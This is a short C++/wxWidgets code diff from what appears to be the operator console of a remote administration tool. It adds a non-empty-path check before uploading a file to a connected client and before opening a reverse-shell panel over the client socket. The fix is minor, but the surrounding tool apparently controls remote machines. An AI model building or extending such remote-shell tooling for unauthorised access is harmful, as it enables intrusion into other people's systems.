@@ -270,21 +270,25 @@ void panelFileManager::OnToolBarClick(wxCommandEvent& event) {
 			this->listManager->OnBorrarArchivo(event);
 			break;
 		case EnumIDS::ID_Panel_FM_Subir:
-			wxFileDialog dialog(this, "Seleccionar archivo a enviar", wxEmptyString, wxEmptyString, wxFileSelectorDefaultWildcardStr, wxFD_OPEN | wxFD_FILE_MUST_EXIST);
-			if (dialog.ShowModal() == wxID_OK) {
-				std::string strTID = this->strID;
-				std::string strRutaLocal = dialog.GetPath();
-				std::string strRutaRemota = this->txt_Path->GetValue();
-				strRutaRemota += dialog.GetFilename();
-				std::thread thEnviar([this, strRutaLocal, strRutaRemota, strTID] {
-					this->EnviarArchivo(strRutaLocal, strRutaRemota.c_str(), strTID);
-				});
-				thEnviar.detach();
+			if (this->RutaActual().size() > 0) {
+				wxFileDialog dialog(this, "Seleccionar archivo a enviar", wxEmptyString, wxEmptyString, wxFileSelectorDefaultWildcardStr, wxFD_OPEN | wxFD_FILE_MUST_EXIST);
+				if (dialog.ShowModal() == wxID_OK) {
+					std::string strTID = this->strID;
+					std::string strRutaLocal = dialog.GetPath();
+					std::string strRutaRemota = this->txt_Path->GetValue();
+					strRutaRemota += dialog.GetFilename();
+					std::thread thEnviar([this, strRutaLocal, strRutaRemota, strTID] {
+						this->EnviarArchivo(strRutaLocal, strRutaRemota.c_str(), strTID);
+						});
+					thEnviar.detach();
+				}
 			}
 			break;
 		case EnumIDS::ID_Panel_FM_Shell:
-			panelReverseShell* panelShell = new panelReverseShell(this, this->sckCliente, this->strID, this->enc_key, this->RutaActual().ToStdString());
-			panelShell->Show();
+			if (this->RutaActual().size() > 0) {
+				panelReverseShell* panelShell = new panelReverseShell(this, this->sckCliente, this->strID, this->enc_key, this->RutaActual().ToStdString());
+				panelShell->Show();
+			}
 			break;
 	}
 }
